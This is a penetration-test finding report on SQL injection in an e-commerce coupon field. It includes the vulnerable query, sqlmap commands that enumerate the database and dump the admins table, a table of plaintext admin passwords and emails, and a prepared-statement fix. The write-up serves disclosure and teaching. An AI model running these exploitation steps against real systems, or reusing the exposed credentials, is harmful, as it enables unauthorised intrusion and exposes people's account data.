# Finding 1: SQL Injection on Coupon Code Input (cart.php)

[← Back to Finding Summary](./05-finding-summary.md) | [← Back to README](./README.md)

---

**CVSS Score: 7.5 (High)**  
**Category (OWASP):** SQL Injection  
**Affected Endpoints:** `cart.php`, `detail.php`, `checkout.php`, `customer_register.php`

---

## Risk

An attacker can execute SQL Injection without authentication and exploit the database — including dumping sensitive data such as database names, table names, and table contents (e.g., products, customers, and the admins table containing admin accounts and passwords). This is extremely dangerous because the attacker can obtain admin credentials and proceed with further exploitation using the admin panel features.

Proven SQL Injection also opens the door for attackers to manipulate data such as product information, orders, customers, and prices — directly impacting business operations.

---

## Severity

Classified as **High** because exploitation can be performed remotely over the internet, without requiring authentication or authorization, and affects the Confidentiality, Integrity, and Availability of data. This vulnerability also serves as the **primary entry point** for the broader attack chain.

---

## CVSS Base Score Breakdown

| **Metric** | **Value** | **Reason** |
|---|---|---|
| Attack Vector | Network | Exploitable directly over the internet without local access. |
| Attack Complexity | Low | Trivial using simple payloads like `' OR 1=1` or automated tools like SQLMap. |
| Privileges Required | None | No account or authentication needed. |
| User Interaction | None | No interaction from another user required. |
| Scope | Unchanged | Impact limited to the same web application and database. |
| Confidentiality Impact | High | Attacker can read the entire database including sensitive data. |
| Integrity Impact | None | Does not directly alter data integrity. |
| Availability Impact | Low | Does not directly affect data availability. |

---

## Vulnerable Source Code (`cart.php`)

The script runs user input directly without any sanitization:

```php
// ❌ Vulnerable — input executed directly by the database
select * from coupons where coupon_code='$code'
```

No Prepared Statement or Parameterized Query is applied.

---

## Exploitation Steps

1. Navigate to `http://dibishop.duckdns.org/cart.php`
2. Inject SQL syntax into the coupon field — the resulting SQL error message confirms the input is executed directly by the database.
3. Capture the request payload using Burp Suite and save it as `request.txt` for use with SQLMap.

<img width="750" height="225" alt="image" src="https://github.com/user-attachments/assets/8d41264f-4ef4-4b70-b0c8-2defe0456eb7" />

5. Run SQLMap commands:

```bash
# Step 1: Enumerate databases
sqlmap -r request.txt -p code --dbs
# → Found database: dibimbing-shop

# Step 2: List tables
sqlmap -r request.txt -p code -D dibimbing-shop --tables

# Step 3: Dump the admins table
sqlmap -r request.txt \
  -p "code" \
  --level=3 --risk=3 \
  --dbms=mysql \
  -D dibimbing-shop \
  -T admins \
  --dump \
  --batch \
  --random-agent \
  2>&1 | tee sqlmap_admins.txt
```

---

## Exploitation Results

The attacker successfully dumped the `admins` table:

<img width="900" height="206" alt="image" src="https://github.com/user-attachments/assets/4f534fc4-aa1b-4111-9851-c84c81b19c3b" />


| **admin_id** | **admin_name** | **admin_email** | **admin_pass (PLAIN TEXT)** |
|---|---|---|---|
| 12 | fahmi@cakrawala.ac.id | fahmi@cakrawala.ac.id | admindibimbing |
| 15 | Rahasia | rahasia27@gmail.com | rahasia27 |
| 18 | dibi | dibi@shop.org | balonkuadaempat |

---

## Impact

- **Full database compromise** — all data of 33 customers, 187 products, and Rp 1,171,001,350 in earnings exposed.
- **Admin credential leak** — allows login to the admin panel without brute force.
- **Customer data exposure** — names, emails, addresses, contacts, and order history can be dumped.
- **Data manipulation** — attacker can modify product data, pricing, orders, and coupons, causing financial losses.

---

## Mitigation

Use **Prepared Statements / Parameterized Queries** for all database queries:

```php
// ✅ Fixed
$stmt = $con->prepare("SELECT * FROM coupons WHERE coupon_code = ?");
$stmt->bind_param("s", $code);
$stmt->execute();
```

Additional steps:
- Hash all passwords with bcrypt or Argon2 — **never store plain text**.
- Apply input validation and whitelist only allowed characters.
- Disable SQL error details from the browser (`display_errors = Off` in production).
